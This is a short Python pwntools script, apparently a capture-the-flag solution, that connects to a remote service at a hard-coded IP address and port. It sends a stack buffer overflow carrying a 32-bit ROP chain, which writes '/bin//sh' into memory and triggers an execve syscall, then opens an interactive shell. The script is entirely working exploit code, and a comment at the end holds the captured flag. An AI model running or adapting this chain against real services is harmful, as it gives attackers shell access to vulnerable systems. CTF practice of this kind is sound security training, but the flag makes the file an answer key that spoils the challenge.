from pwn import *

s = remote('45.122.249.68', 10002)

payload = b'A' * 0x8c

payload += p32(0x0806cca8) # pop edx ; ret
payload += p32(0x080d9060) # @ .data
payload += p32(0x080a89e6) # pop eax ; ret
payload += b'/bin'
payload += p32(0x08056d25) # mov dword ptr [edx], eax ; ret
payload += p32(0x0806cca8) # pop edx ; ret
payload += p32(0x080d9064) # @ .data + 4
payload += p32(0x080a89e6) # pop eax ; ret
payload += b'//sh'
payload += p32(0x08056d25) # mov dword ptr [edx], eax ; ret
payload += p32(0x0806cca8) # pop edx ; ret
payload += p32(0x080d9068) # @ .data + 8
payload += p32(0x080562e0) # xor eax, eax ; ret
payload += p32(0x08056d25) # mov dword ptr [edx], eax ; ret
payload += p32(0x080481c9) # pop ebx ; ret
payload += p32(0x080d9060) # @ .data
payload += p32(0x0806e052) # pop ecx ; pop ebx ; ret
payload += p32(0x080d9068) # @ .data + 8
payload += p32(0x080d9060) # padding without overwrite ebx
payload += p32(0x0806cca8) # pop edx ; ret
payload += p32(0x080d9068) # @ .data + 8
payload += p32(0x080a89e6) # pop eax ; ret
payload += p32(0x0000000b)
payload += p32(0x080495a3) # int 0x80

assert len(payload) <= 256

s.sendline(payload)

s.interactive()
#flag{dung_thay_hoa_no_ma_ngo_xuan_ve}
